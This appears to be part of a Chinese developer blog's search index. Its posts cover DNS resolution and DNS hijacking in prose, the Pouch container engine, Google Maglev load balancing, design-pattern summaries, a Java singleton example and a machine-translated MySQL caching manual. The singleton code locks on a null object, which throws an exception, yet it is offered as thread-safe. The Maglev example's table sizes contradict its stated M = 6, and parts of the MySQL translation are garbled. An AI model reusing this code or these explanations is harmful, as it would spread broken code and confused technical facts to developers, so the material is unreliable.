    <content type="text"><![CDATA[域名解析dns重定向存储:本地.阿里云.万网dns服务器 dns 在网络上其实就是域名解析到ip的一个过程叫dns解析 本站域名 www.wuxinvip.com 解析ip 为 39.107.82.228 以此为例、过程 1、用户请求数据、发送域名到域名解析服务器 2、将域名发送到dns服务解析器【国外顶级域名dns服务器、万网dns服务器、阿里dns服务器】 一般你的域名在哪里买的 会有相应的dns解析服务器【免费提供】 当然这个解析的过程、请求会发到一个主机器、这个机器按照不同规则、将解析 分发个各个dns解析器、然后返回域名对应的外网ip地址 用户拿个这个ip 呼叫公网上叫这个ip的服务器 建立会话 域名攻击1234567891011121314 域名直接污染 域名间接污染域名直接污染: 在用户请求域名的ip地址途中、通过拦截域名解析、把ip指向别的服务器、 比如很普通的、当年百度网站被指向了一个荷兰的一个ip、这就是dns劫持攻击、简单暴力直接瘫痪你的网站 域名间接污染：这个就比较复杂了、dns解析服务器也是一个梯度服务器、上游将域名解析列表发送给下游服务器如果在上游服务器到下游服务器之间做一个拦截、那么将导致下游的dns解析全部错误、现在的google不能访问就是这个样子、所以有了各大host访问谷歌的功能、不过把google真正的ip解析放到自己的电脑里直接访问ip方式、也只能解决很小一部分墙问题、这些ip后续防火墙也会封掉的、这个就涉及到国家的网络与国际链接的国际出入口的防火墙上（像我天朝“G/.F/.W/.”）、基本上也算是最大的dns污染源]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pouch]]></title>
    <url>%2F2018%2F03%2F24%2Fcontainer%2Fpouch%2F</url>
    <content type="text"><![CDATA[2017.11.19正式开源pouch pouch 基于Apache2.0协议的容器技术 介绍：Pouch 是一个轻量级容器技术特点：快速高效、可移植性高、资源占用少 github：pouch 11年基于Linux内核上的namespace、cgroup等技术开始成熟、阿里Pouch基于LXC研发的第一代容器t413年Docker横空出世、解决了行业多年的”软件封装”问题、阿里吸收其经验、打磨Pouch Pouch规模2017 年双 11，巨额交易 1682 亿背后，Pouch 在”超级工程”中做到了： 1、100% 的在线业务 Pouch 化2、容器规模达到百万级1234阿里集团内部，Pouch 的日常服务已经覆盖绝大部分的事业部，覆盖的业务场景包括：电商、广告、搜索等；覆盖技术栈包括：电商应用、数据库、大数据、流计算等；覆盖编程语言：Java、C++、NodeJS 等。 Pouch 技术优势1、隔离性强12345678910众所周知，行业中的容器方案大多基于 Linux 内核提供的 cgroup 和 namespace 来实现隔离，然后这样的轻量级方案存在弊端：.容器间，容器与宿主间，共享同一个内核；.内核实现的隔离资源，维度不足。面对如此的内核现状，阿里巴巴采取了三个方面的工作，来解决容器的安全问题：用户态增强容器的隔离维度，比如网络带宽、磁盘使用量等；给内核提交 patch，修复容器的资源可见性问题，cgroup 方面的 bug；实现基于 Hypervisor 的容器，通过创建新内核来实现容器隔离。 2、P2P镜像分发123点对点分发镜像【相对于中央仓库分发镜像、极大见笑了中央仓库的网络压力】工具：阿里巴巴镜像分发工具&quot;蜻蜓&quot; 蜻蜓地址 3、富容器技术123456789 Pouch 技术可以说对业务没有任何的侵入性，也正是因为这一点在集团内部做到 100% 容器化。这样的容器技术，被无数阿里人称为“富容器”。“富容器”技术的实现，主要是为了在 Linux 内核上创建一个与虚拟机体验完全一致的容器。如此一来，比一般容器要功能强大，内部有完整的 init 进程，以及业务应用需要的任何服务，当然这也印证了 Pouch 为什么可以做到对应用没有“侵入性”。技术的实现过程中，Pouch 需要将容器的执行入口定义为 systemd，而在内核态，Pouch 引入了 cgroup namespace 这一最新的内核 patch，满足 systemd 在富容器模式的隔离性。从企业运维流程来看，富容器同样优势明显。它可以在应用的 Entrypoint 启动之前做一些事情，比如统一要做一些安全相关的事情，运维相关的 agent 拉起。这些需要统一做的事情，倘若放到用户的启动脚本，或镜像中就对用户的应用诞生了侵入性，而富容器可以透明的处理掉这些事情。 4、内核兼容性可以理解为兼容老版本linux内核系统 Pouch 的生态架构可以从两个方面来看：第一，如何对接容器编排系统；第二，如何加强容器运行时。 传统的容器引擎方案相似，Pouch 也呈现出 C/S 的软件架构。命令行 CLI 层面，可以同时支持 Pouch CLI 以及 Docker CLI。对接容器 runtime，Pouch 内部通过 container client 通过 gRPC 调用 containerd。Pouch Daemon 的内部采取组件化的设计理念，抽离出相应的 System Manager、Container Manager、Image Manager、Network Manager、Volume Manager 提供统一化的对象管理方案。 以上内容来自 infoq阿里关于pouch介绍]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[maglev]]></title>
    <url>%2F2018%2F03%2F24%2Fload-balance%2Fmaglev%2F</url>
    <content type="text"><![CDATA[简介Google Maglev 是一个牛逼的负载均衡器，之所以牛逼，是因为它不用部署专门的物理设备，不像 LVS 一样工作在内核，它是运行在通用 Linux 服务器上的大型分布式软件系统。 Google Maglev 工作流程 每个 Google 服务都有一个或者多个 VIP，一个 VIP 和物理 IP 的区别在于 VIP 没有绑给某个特定的网卡。 VIP 注解Maglev 关联每个 VIP 到具体的 Endpoint，然后通过 BGP 将 VIP 宣告给上游路由器，然后路由器再把 VIP 宣告给 Google 的骨干网，这样使得 VIP 能被访问到。 流程当用户访问 www.google.com 时： 浏览器先发送一个 DNS 请求， DNS 服务返回 VIP。 然后浏览器尝试与该 VIP 建立连接。 当路由器接收到 VIP 数据包，通过 ECMP 将数据包路由到 Maglev 集群中的某台机器上。 当 Maglev 的机器接收到数据包， 从关联到该 VIP 的 Endpoint 中选择一个， 然后用 GRE 封包发送，外层的 IP 即 Endpoint 的物理 IP。 当 Endpoint 处理完数据包进行响应时，源地址用 VIP 填充，目的地址为用户 IP。 使用直接服务返回(Direct Server Return， DSR) ，将响应直接发送给路由器， 这样 Maglev 无需处理响应包。 Google Maglev 结构”&gt;}} 结构Maglev 由控制器（Controller）和 转发器（Forwarder）组成： 控制器向路由器宣告 VIP。控制器周期性地检查转发器的健康状态，来宣告或者撤回 VIP。确保路由器只转发包到健康的 Magvel。 转发器转发 VIP 流量到 Endpoint。每个 VIP 都有一个后端池（BP），BP 可能包含 Endpoint 的 IP，也有可能包含其它 BP。每个 BP 会对 Endpoint 进行健康检查，保证数据包转发到健康的 Endpoint。 转发器的设计和实现 Google Maglev 转发器结构”&gt;}} 设计转发器直接从网卡接收数据包，通过 GRE/IP 封包，再将它们发回网卡。 Linux 内核不参与这个过程。 Steering 处理从 NIC（网卡）接收来的数据包，通过五元组（IP地址，源端口，目的IP地址，目的端口和传输层协议）哈希，然后交给不同的接收队列。 包重写线程从接收队列取包，然后进行后端选择，用 GRE 封包后，发送到传输队列。 Muxing 轮询从所有的传输队列取包，再发送给网卡。 Google Maglev 快速包处理”&gt;}} Maglev 在包处理时绕开了 Linux 内核，因为内核开销非常严重。 如图，转发器和网卡共用数据包池（Packet Pool），转发器中的 Steering 和 Muxing 都通过指针的环形队列，指向该池。 对于 Seering： 当网卡接收到数据包时，放在 Recieved 所指位置，并向前移动指针。 分发包到接收队列时，向前移动Processed 指针。 预留未使用数据包，放入队列中并向前移动 Reserved 指针。 对于 Muxing： 网卡将 Sent 所指的数据包发出去，并向前移动指针。 将被重写的数据包放入队列中，并向前移动 Ready 指针。 同时将已被发送的包归回给数据包池，并向前移动 Recycled 指针。 整个过程都没有包拷贝。 后端选择 Maglev首先检查本地的连接跟踪表，看看该数据包是否属于任何一个已有的连接，如果连接已经建立，则直接将数据包发到该连接对应的服务器上去。 如果连接没有建立，此时就需要一致性哈希函数选择一个后端服务器了，并添加到连接跟踪表。 Maglev 一致性哈希的基本思想就是： 有一个共享的Entry表，可以通过Entry[Hash % M]选择对应后端，M为Entry表大小。 每个后端对所有Entry表位置有自己的优先级排序，存在permutation表里。 所有的后端通过优先级顺序轮流填充Entry 中的空白位置，直至填满。每次都填充自己优先级最高的空位置。例如，假设M = 6，且12345678910111213141516B0: permutation[] = &#123; 3, 0, 4, 1, 5, 2, 6 &#125;B1: permutation[] = &#123; 0, 2, 4, 6, 1, 3, 5 &#125;B2: permutation[] = &#123; 3, 4, 5, 6, 0, 1, 2 &#125;permutation优先级是从大到小，那么最后填充后的Entry表为：Entry[] = &#123; B1, B0, B1, B0, B2, B2, B0 &#125;说明：B0 的优先级最高的位置是Entry[3]，其为空，则Entry[3] = B0。B1 是Entry[0]，则Entry[0]=B1。B2 是Entry[3]，但是已被占，下一个是Entry[4]，为空，则Entry[4]=B2。以此类推，直至填满。 操作经验 Google Maglev VIP 匹配”&gt;}} 有时候，我们需要利用 Maglev 封包将流量重定向到其他的集群中的相同服务，这就有点麻烦了，因为集群间是独立的，我们不知道其它集群相同服务的 VIP。 VIP 可以通过最长前缀匹配，来决定集群，利用最长后缀匹配决定那个后端池。 如图中的例子，当请求 173.194.71.1 时，通过最长前缀（173.194.71.0/24）选择 C2 集群，通过最长后缀（0.0.0.1/8）决定是 Service 1 后端池。 假定 Maglev 需要将流量转发到 C3（173.194.72.0/24），只需要用相同的后缀构造出 VIP （173.194.72.1）进行转发，即可转发到 Maglev 的 Service 1 后端池。 分片处理 分片时，非首个分片只包含三元组（目的IP地址，目的端口和传输层协议），这便无法正确决定如何转发，因为转发根据的是五元组。 解决方法是： 每个 Maglev 配置了一个特殊的后端池，包含所有的 Maglev 机器。 一旦接收到分片， Maglev 用三元组哈希选择特定的 Maglev 作为后端进行转发，将它们重定向给相同的 Maglev。 Maglev 为未分片数据包和第二跳的首分片使用相同的后端决策算法，以保证非分片、首个分片和非首个分片选择同一个后端。 Magelv 维护了一个固定大小的分片表，记录了首分片的转发决策。 当 Maglev 收到一个第二跳非首分片， 会从分片表中查找，若匹配则立即转发； 否则，会缓存到分片表中，直到首分片收到或者老化。 转载地址]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式-行为型]]></title>
    <url>%2F2018%2F03%2F24%2Fdesign-pattern%2Fbehavior%2F</url>
    <content type="text"><![CDATA[设计模式行为型–11种 责任链—-请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。 命令—-请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。 解释器—-这种模式实现了一个表达式接口，该接口解释一个特定的上下文。这种模式被用在 SQL 解析、符号处理引擎等。 迭代器—-这种模式用于顺序访问集合对象的元素，不需要知道集合对象的底层表示。 中介者—-这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。 备忘录—-保存一个对象的某个状态，以便在适当的时候恢复对象。备忘录模式属于行为型模式。 观察者—-当对象间存在一对多关系时，则使用观察者模式（Observer Pattern）。比如，当一个对象被修改时，则会自动通知它的依赖对象。 状态—-我们创建表示各种状态的对象和一个行为随着状态对象改变而改变的 context 对象。 空对象—-在空对象模式（Null Object Pattern）中，一个空对象取代 NULL 对象实例的检查。Null 对象不是检查空值，而是反应一个不做任何动作的关系。 这样的 Null 对象也可以在数据不可用的时候提供默认的行为。 策略 在策略模式（Strategy Pattern）中，一个类的行为或其算法可以在运行时更改。这种类型的设计模式属于行为型模式。 在策略模式中，我们创建表示各种策略的对象和一个行为随着策略对象改变而改变的 context 对象。策略对象改变 context 对象的执行算法。 模板 在模板模式（Template Pattern）中，一个抽象类公开定义了执行它的方法的方式/模板。 它的子类可以按需要重写方法实现，但调用将以抽象类中定义的方式进行。这种类型的设计模式属于行为型模式。 访问 在访问者模式（Visitor Pattern）中，我们使用了一个访问者类，它改变了元素类的执行算法。 通过这种方式，元素的执行算法可以随着访问者改变而改变。这种类型的设计模式属于行为型模式。 根据模式，元素对象已接受访问者对象，这样访问者对象就可以处理元素对象上的操作。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式-创建型]]></title>
    <url>%2F2018%2F03%2F24%2Fdesign-pattern%2Festablish%2F</url>
    <content type="text"><![CDATA[设计模式创建型–5种 单例—-创建线程安全类 工厂—-创建bean工厂 抽象工厂—-创建bean工厂的工厂 原型—-clone模式 —用于数据流转中对象快速复制 建造者—创建bean类型多样组合-创建方式不变-依靠算法实现不同组合创建bean 单例 1234567891011121314151617181920212223242526272829303132/** * Created by huoyan403 on 2017/8/14. */public class Singleton &#123; //防止被引用 赋值为null 目的实现延迟加载 private static Singleton singleton = null; //私有化构造方法 private Singleton() &#123; &#125; //静态工程方法 创建实例 public static Singleton getSingleton()&#123; if(singleton == null)&#123; //synchronized关键字锁住的是这个对象，这样的用法，在性能上会有所下降，因为每次调用getInstance()， // 都要对对象上锁，事实上，只有在第一次创建对象的时候需要加锁，之后就不需要了 synchronized (singleton)&#123; if(singleton == null) &#123; singleton = new Singleton(); &#125; &#125; &#125; return singleton; &#125; //如果该对象被用于序列化 可以保证在序列化前后保持一致 public Object readResolve()&#123; return singleton; &#125;&#125; 工厂 抽象工厂 原型 建造者]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式-结构型]]></title>
    <url>%2F2018%2F03%2F24%2Fdesign-pattern%2Fstructure%2F</url>
    <content type="text"><![CDATA[设计模式-结构型–7种 组合、适配器、过滤器、桥接、装饰、外观、享元、代理 组合–最为常用–将对象组合成一个树状结构、例如菜单上做自循环 适配器–播放器格式适配–对类型判定使用不同子类方法实例 桥接–封装类组合形成一个复杂对象–把复杂对象拆分简单对象 过滤器–使用不同标准来过滤一组对象 装饰–不增加子类-扩展类属性 外观–外部定义一个高层接口-直接使用其属性 享元—不太了解 代理–使用一个类来代理另一个类来执行业务逻辑–简单来讲-classB代理classA、classB来处理业务逻辑]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【缓存优化】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-cached%2F</url>
    <content type="text"><![CDATA[8.10.1 InnoDB缓冲池优化8.10.2 MyISAM密钥缓存8.10.3 MySQL查询缓存8.10.4准备好的语句和存储程序的缓存MySQL使用几种策略来缓存内存缓冲区中的信息以提高性能。 8.10.1 InnoDB缓冲池优化InnoDB维护一个称为缓冲池的存储区域， 用于缓存内存中的数据和索引。知道InnoDB缓冲池如何 工作，并利用它来将频繁访问的数据保存在内存中，是MySQL调优的一个重要方面。 有关InnoDB缓冲池内部工作原理的说明， LRU替换算法的概述以及常规配置信息，请参见第14.6.3.1节“InnoDB缓冲池”。 有关其他InnoDB缓冲池配置和调整信息，请参阅以下部分： 第14.6.3.5节“配置InnoDB缓冲池预取（预读）” 第14.6.3.6节“配置InnoDB缓冲池刷新” 第14.6.3.4节“使缓冲池扫描抗性” 第14.6.3.3节“配置多个缓冲池实例” 第14.6.3.8节“保存和恢复缓冲池状态” 第14.6.3.7节“微调InnoDB缓冲池刷新” 第14.6.3.2节“配置InnoDB缓冲池大小” 8.10.2 MyISAM密钥缓存8.10.2.1共享密钥缓存访问8.10.2.2多个密钥缓存8.10.2.3中点插入策略8.10.2.4索引预加载8.10.2.5密钥缓存块大小8.10.2.6重构密钥缓存为了最小化磁盘I / O，MyISAM存储引擎利用许多数据库管理系统使用的策略。它采用缓存机制将最常访问的表块保存在内存中： 对于索引块，维护称为密钥缓存（或 密钥缓冲区）的特殊结构 。该结构包含许多块缓冲区，其中放置了最常用的索引块。 对于数据块，MySQL不使用特殊缓存。相反，它依赖于本机操作系统文件系统缓存。 本节首先介绍MyISAM密钥缓存的基本操作 。然后讨论了可以提高密钥缓存性能并使您能够更好地控制缓存操作的功能： 多个会话可以同时访问缓存。 您可以设置多个密​​钥缓存并将表索引分配给特定缓存。 要控制密钥缓存的大小，请使用 key_buffer_size系统变量。如果将此变量设置为零，则不使用密钥缓存。如果key_buffer_size值太小而无法分配最小数量的块缓冲区，则不使用密钥缓存 （8）。 当密钥缓存不可操作时，仅使用操作系统提供的本机文件系统缓冲来访问索引文件。（换句话说，使用与表数据块相同的策略访问表索引块。） 索引块是对MyISAM索引文件的连续访问单元 。通常，索引块的大小等于索引B树的节点大小。（索引在磁盘上使用B树数据结构表示。树底部的节点是叶节点。叶节点上方的节点是非叶节点。） 密钥缓存结构中的所有块缓冲区大小相同。该大小可以等于，大于或小于表索引块的大小。通常这两个值中的一个是另一个的倍数。 当必须访问来自任何表索引块的数据时，服务器首先检查它是否在密钥缓存的某个块缓冲区中可用。如果是，则服务器访问密钥缓存中的数据而不是磁盘上的数据。也就是说，它从缓存读取或写入其中而不是读取或写入磁盘。否则，服务器选择包含不同表索引块（或块）的高速缓存块缓冲区，并用必需的表索引块的副本替换那里的数据。只要新索引块位于缓存中，就可以访问索引数据。 如果发生了选择替换的块已被修改，则该块被认为是“ 脏的。“在这种情况下，在被替换之前，其内容被刷新到它所来自的表索引。 通常服务器遵循LRU（最近最少使用）策略：当选择要替换的块时，它选择最近最少使用的索引块。为了使这个选择更容易，密钥缓存模块将所有使用的块维护在按使用时间排序的特殊列表（LRU链）中。访问块时，它是最近使用的块，位于列表的末尾。当需要替换块时，列表开头的块是最近最少使用的块，并成为第一个驱逐的候选块。 该InnoDB存储引擎还采用LRU算法来管理它的缓冲池。请参见 第14.6.3.1节“InnoDB缓冲池”。 8.10.2.1共享密钥缓存访问线程可以同时访问密钥缓存缓冲区，但要符合以下条件： 多个会话可以访问未更新的缓冲区。 正在更新的缓冲区会导致需要使用它的会话等待更新完成。 多个会话可以发起导致高速缓存块替换的请求，只要它们不相互干扰（即，只要它们需要不同的索引块，从而导致不同的高速缓存块被替换）。 对密钥缓存的共享访问使服务器能够显着提高吞吐量。 8.10.2.2多个密钥缓存对密钥缓存的共享访问可提高性能，但不会完全消除会话之间的争用。他们仍在竞争管理对密钥缓存缓冲区的访问的控制结构。为了进一步减少密钥缓存访问争用，MySQL还提供了多个密钥缓存。此功能使您可以将不同的表索引分配给不同的密钥缓存。 在存在多个密钥缓存的情况下，服务器必须知道在处理给定MyISAM表的查询时要使用哪个缓存 。默认情况下，所有 MyISAM表索引都缓存在默认密钥缓存中。要将表索引分配给特定的键缓存，请使用该CACHE INDEX 语句（请参见第13.7.6.2节“CACHE INDEX语法”）。例如，下面的语句从表中分配指标 t1，t2以及 t3名为键缓存 hot_cache： MySQL的&gt; CACHE INDEX t1, t2, t3 IN hot_cache; ——— + ——————– + ———- + ——- — +| 表| Op | Msg_type | Msg_text | ——— + ——————– + ———- + ——- — +| test.t1 | assign_to_keycache | 状态| 好的| test.t2 | assign_to_keycache | 状态| 好的| test.t3 | assign_to_keycache | 状态| 好的 ——— + ——————– + ———- + ——- — +CACHE INDEX可以SET GLOBAL通过使用参数设置语句或使用服务器启动选项设置其大小来创建语句中 引用的键高速缓存。例如： MySQL的&gt; SET GLOBAL keycache1.key_buffer_size=128*1024;要销毁密钥缓存，请将其大小设置为零： MySQL的&gt; SET GLOBAL keycache1.key_buffer_size=0;您无法销毁默认密钥缓存。任何尝试这样做都会被忽略： MySQL的&gt; SET GLOBAL key_buffer_size = 0; MySQL的&gt; SHOW VARIABLES LIKE ‘key_buffer_size’; —————– + ——— +| Variable_name | 值| —————– + ——— +| key_buffer_size | 8384512 | —————– + ——— +密钥缓存变量是具有名称和组件的结构化系统变量。For keycache1.key_buffer_size， keycache1是缓存变量名称， key_buffer_size是缓存组件。有关用于引用结构化密钥缓存系统变量的语法的说明，请参见第5.1.8.1节“结构化系统变量”。 默认情况下，表索引分配给在服务器启动时创建的主（默认）密钥缓存。销毁密钥缓存时，分配给它的所有索引都将重新分配给默认密钥缓存。 对于繁忙的服务器，您可以使用涉及三个密钥缓存的策略： 一个“ 热 ”键高速占用分配给所有键高速缓冲空间的20％。对于大量用于搜索但未更新的表使用此选项。 一个“ 冷 ”键高速占用分配给所有键高速缓冲空间的20％。将此缓存用于中型，密集修改的表，例如临时表。 一个“ 温暖 ”键高速占用键高速缓冲空间的60％。将此作为默认密钥缓存，默认情况下用于所有其他表。 使用三个密钥高速缓存有益的一个原因是对一个密钥高速缓存结构的访问不会阻止对其他密钥高速缓存的访问。访问分配给一个缓存的表的语句不会与访问分配给另一个缓存的表的语句竞争。性能提升也出于其他原因： 热缓存仅用于检索查询，因此永远不会修改其内容。因此，每当需要从磁盘引入索引块时，不需要首先刷新选择用于替换的高速缓存块的内容。 对于分配给热缓存的索引，如果不存在需要索引扫描的查询，则对应于索引B树的非叶节点的索引块很可能保留在缓存中。 当更新的节点在高速缓存中并且不需要首先从磁盘读入时，对于临时表最频繁执行的更新操作执行得更快。如果临时表的索引的大小与冷键高速缓存的大小相当，则更新的节点在高速缓存中的概率非常高。 该CACHE INDEX语句在表和密钥缓存之间建立关联，但每次服务器重新启动时关联都会丢失。如果希望关联在每次服务器启动时生效，则实现此目的的一种方法是使用选项文件：包括配置密钥缓存的变量设置，以及init-file命名包含CACHE INDEX 要执行的语句的文件的 选项。例如： key_buffer_size = 4Ghot_cache.key_buffer_size = 2Gcold_cache.key_buffer_size = 2Ginit_file = / path/ to/ data-directorymysqld_init.sqlmysqld_init.sql每次服务器启动时都会执行 语句。该文件每行应包含一个SQL语句。以下示例分别为hot_cache和 分配了几个表cold_cache： CACHE INDEX db1.t1，db1.t2，db2.t3在hot_cache中CACHE INDEX db1.t4，db2.t5，db2.t6在cold_cache中8.10.2.3中点插入策略默认情况下，密钥缓存管理系统使用简单的LRU策略来选择要逐出的密钥缓存块，但它还支持称为中点插入策略的更复杂的方法 。 使用中点插入策略时，LRU链分为两部分：热子列表和热子列表。两部分之间的分割点并不固定，但是密钥缓存管理系统注意到热部分不是 “ 太短 ”，总是包含至少 key_cache_division_limit 百分比的密钥缓存块。 key_cache_division_limit是结构化键缓存变量的组件，因此其值是可以为每个缓存设置的参数。 当索引块从表中读入密钥缓存时，它将放在暖子列表的末尾。在一定数量的命中（访问块）之后，它被提升到热子列表。目前，促进块（3）所需的命中数对于所有索引块是相同的。 升级到热子列表的块放在列表的末尾。然后该块在该子列表中循环。如果块在子列表的开头停留足够长的时间，则将其降级为暖子列表。此时间由key_cache_age_threshold 密钥缓存的组件的值确定 。 阈值规定，对于包含N块的密钥缓存，在最后一次N * key_cache_age_threshold / 100命中内未访问的热子列表开头的块 将被移动到暖子列表的开头。然后它成为第一个被驱逐的候选者，因为替换的块总是从暖子列表的开头获取。 中点插入策略使您可以将更多值的块始终保留在缓存中。如果您更喜欢使用普通LRU策略，请将 key_cache_division_limit 值设置为默认值100。 当执行需要索引扫描的查询有效地从缓存中推出对应于有价值的高级B树节点的所有索引块时，中点插入策略有助于提高性能。为避免这种情况，您必须使用key_cache_division_limit设置为远小于100 的中点插入策略 。然后，在索引扫描操作期间，有价值的频繁命中节点也会保留在热子列表中。 8.10.2.4索引预加载如果密钥缓存中有足够的块来保存整个索引的块，或者至少是与其非叶节点对应的块，则在开始使用之前使用索引块预加载密钥缓存是有意义的。预加载使您能够以最有效的方式将表索引块放入密钥缓存缓冲区：通过顺序从磁盘读取索引块。 在没有预加载的情况下，块仍然根据查询的需要放入密钥缓存中。虽然这些块将保留在缓存中，因为所有缓冲区都有足够的缓冲区，它们是以随机顺序从磁盘中提取的，而不是按顺序提取的。 要将索引预加载到缓存中，请使用该 LOAD INDEX INTO CACHE语句。例如，以下语句预加载表的索引的节点（索引块），t1并且t2： MySQL的&gt; LOAD INDEX INTO CACHE t1, t2 IGNORE LEAVES; ——— + ————– + ———- + ———- +| 表| Op | Msg_type | Msg_text | ——— + ————– + ———- + ———- +| test.t1 | preload_keys | 状态| 好的| test.t2 | preload_keys | 状态| 好的 ——— + ————– + ———- + ———- +所述IGNORE LEAVES改性剂导致要预装只为索引的非叶结点的块。因此，显示的语句预加载所有索引块t1，但仅从非叶节点预加载 t2。 如果已使用CACHE INDEX语句将索引分配给键高速缓存 ，则预加载会将索引块放入该高速缓存中。否则，索引将加载到默认密钥缓存中。 8.10.2.5密钥缓存块大小可以使用key_cache_block_size 变量为单个密钥缓存指定块缓冲区的大小 。这允许调整索引文件的I / O操作的性能。 当读取缓冲区的大小等于本机操作系统I / O缓冲区的大小时，可以实现I / O操作的最佳性能。但是，将关键节点的大小设置为等于I / O缓冲区的大小并不总能确保最佳的整体性能。在读取大叶子节点时，服务器会吸入大量不必要的数据，有效地阻止了读取其他叶子节点。 要控制表的.MYI 索引文件中块的大小MyISAM，请使用–myisam-block-size服务器启动时的 选项。 8.10.2.6重构密钥缓存可以通过更新其参数值随时重新构建密钥缓存。例如： MySQL的&gt; SET GLOBAL cold_cache.key_buffer_size=410241024;如果为key_buffer_size或 key_cache_block_size缓存组件分配 的值与组件的当前值不同，则服务器会销毁缓存的旧结构并根据新值创建新结构。如果缓存包含任何脏块，则服务器会在销毁和重新创建缓存之前将它们保存到磁盘。如果更改其他键缓存参数，则不会进行重组。 重构密钥缓存时，服务器首先将任何脏缓冲区的内容刷新到磁盘。之后，缓存内容变得不可用。但是，重组不会阻止需要使用分配给缓存的索引的查询。相反，服务器使用本机文件系统缓存直接访问表索引。文件系统缓存不如使用密钥缓存有效，因此尽管执行查询，但可以预期减速。重新构建缓存后，它将再次可用于缓存分配给它的索引，并且对索引的文件系统缓存的使用将停止。 8.10.3 MySQL查询缓存8.10.3.1查询缓存的运行方式8.10.3.2查询缓存SELECT选项8.10.3.3查询缓存配置8.10.3.4查询缓存状态和维护注意从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。 查询缓存存储SELECT语句的文本以及 发送到客户端的相应结果。如果稍后收到相同的语句，则服务器从查询缓存中检索结果，而不是再次解析和执行语句。查询缓存在会话之间共享，因此可以发送由一个客户端生成的结果集以响应由另一个客户端发出的相同查询。 查询缓存在您拥有不经常更改且服务器接收许多相同查询的表的环境中非常有用。这是许多基于数据库内容生成许多动态页面的Web服务器的典型情况。 查询缓存不返回过时数据。修改表时，将刷新查询缓存中的所有相关条目。 注意查询缓存在多个mysqld服务器更新相同 MyISAM表的环境中不起作用。 查询高速缓存用于第8.10.3.1节“查询高速缓存如何操作”中描述的条件下的预准备语句。 注意分区表不支持查询缓存，并且对涉及分区表的查询自动禁用查询缓存。无法为此类查询启用查询缓存。 下面是查询缓存的一些性能数据。这些结果是通过在具有2GB RAM和64MB查询缓存的Linux Alpha 2×500MHz系统上运行MySQL基准测试套件生成的。 如果您执行的所有查询都很简单（例如从具有一行的表中选择一行），但仍然不同以便无法缓存查询，则使查询缓存处于活动状态的开销为13％。这可能被认为是最糟糕的情况。在现实生活中，查询往往要复杂得多，因此开销通常会显着降低。 在单行表中搜索单行的查询缓存比没有查询缓存快238％。这可以被视为接近缓存的查询所期望的最小加速。 要在服务器启动时禁用查询缓存，请将query_cache_size系统变量设置 为0.通过禁用查询缓存代码，没有明显的开销。 查询缓存提供了实质性性能改进的潜力，但不要假设它将在所有情况下都这样做。使用某些查询缓存配置或服务器工作负载，您实际上可能会看到性能下降： 请谨慎调整查询缓存的大小，这会增加维护缓存所需的开销，可能超出启用缓存的优势。数十兆字节的大小通常是有益的。数百兆字节的大小可能不是。 服务器工作负载对查询缓存效率有显着影响。几乎完全由一组固定SELECT 语句组成的查询混合更有可能从启用缓存中获益，而不是频繁INSERT语句导致缓存中结果连续失效的混合 。在某些情况下，解决方法是使用该 SQL_NO_CACHE选项来防止结果甚至为SELECT使用频繁修改的表的语句进入缓存 。（请参见 第8.10.3.2节“查询缓存SELECT选项”。） 要验证启用查询缓存是否有益，请在启用和禁用缓存的情况下测试MySQL服务器的操作。然后定期重新测试，因为查询缓存效率可能会随着服 8.10.3.1查询缓存的运行方式注意从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。 本节介绍查询缓存在运行时的工作方式。第8.10.3.3节“查询缓存配置”描述了如何控制它是否可操作。 在解析之前，将传入的查询与查询缓存中的查询进行比较，因此查询缓存将以下两个查询视为不同： SELECT FROM tbl_name选择来自tbl_name查询必须完全相同（字节为字节）才能看作相同。另外，由于其他原因，可以将相同的查询字符串视为不同。使用不同数据库，不同协议版本或不同默认字符集的查询被视为不同的查询，并单独缓存。 缓存不用于以下类型的查询： 查询是外部查询的子查询 在存储的函数，触发器或事件的主体内执行的查询 在从查询缓存中获取查询结果之前，MySQL会检查用户是否拥有所 SELECT涉及的所有数据库和表的权限。如果不是这种情况，则不使用缓存的结果。 如果从查询缓存返回查询结果，则服务器会递增Qcache_hits 状态变量，而不是Com_select。请参见 第8.10.3.4节“查询缓存状态和维护”。 如果表更改，则使用该表的所有高速缓存查询都将变为无效并从高速缓存中删除。这包括使用MERGE映射到已更改表的表的查询。一个表可以被许多类型的语句，如被改变INSERT， UPDATE， DELETE， TRUNCATE TABLE， ALTER TABLE， DROP TABLE，或 DROP DATABASE。 使用InnoDB表时，查询缓存也可在事务中使用 。 SELECT缓存查询对视图 的结果。 查询缓存适用于SELECT SQL_CALC_FOUND_ROWS …查询并存储由以下SELECT FOUND_ROWS()查询返回的值。 FOUND_ROWS()即使从缓存中提取了前面的查询，也会返回正确的值，因为找到的行数也存储在缓存中。该SELECT FOUND_ROWS()查询本身不能被缓存。 使用mysql_stmt_prepare()和 使用二进制协议发布的预准备语句mysql_stmt_execute()（请参见 第27.8.8节“C API准备语句”）受限于缓存。与查询缓存中的语句的比较基于扩展?参数标记后的语句文本。该语句仅与使用二进制协议执行的其他缓存语句进行比较。也就是说，对于查询缓存目的，使用二进制协议发出的预准备语句与使用文本协议发布的预准备语句不同（请参见 第13.5节“准备的SQL语句语法”）。 如果查询使用以下任何功能，则无法缓存该查询： AES_DECRYPT() AES_ENCRYPT() BENCHMARK() CONNECTION_ID() CONVERT_TZ() 